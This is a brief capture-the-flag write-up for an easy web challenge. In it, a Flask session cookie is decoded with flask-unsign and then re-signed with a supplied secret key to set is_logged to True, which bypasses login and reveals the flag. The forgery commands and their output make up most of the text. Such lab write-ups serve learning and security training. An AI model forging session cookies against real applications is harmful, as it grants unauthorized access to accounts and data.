# Questions takeover
**_Web exploitation_** \
Difficulty: Easy

### 1. Unsigning the cookie (after failure) using the `flask-unsign` tool
```shell
python3 flask-unsign --decode --cookie eyJpc19sb2dnZWQiOmZhbHNlfQ.ZqeWdg.cAfCp-FMb78hg7IXB_Mz_oZdLa4
# {'is_logged': False}
```

### 2. Cookie fabrication
Changed its content to `{'is_logged': True}` and signed it with the given secret key
```shell
python3 flask-unsign --sign --cookie "{'is_logged': True}" --secret 'ie3rB96WqjRb35ey74cU' --legacy
# eyJpc19sb2dnZWQiOnRydWV9.ZqehoQ.UylhN1eX7EaSCKzpe931BCdhmeU
```

### 3. Setting the cookie in the browser and refreshing the page

### 4. Result
Flag: `EE_CTF{K0ch4m_S0cz3wk1_XbcHX34UG9YCzTy}`
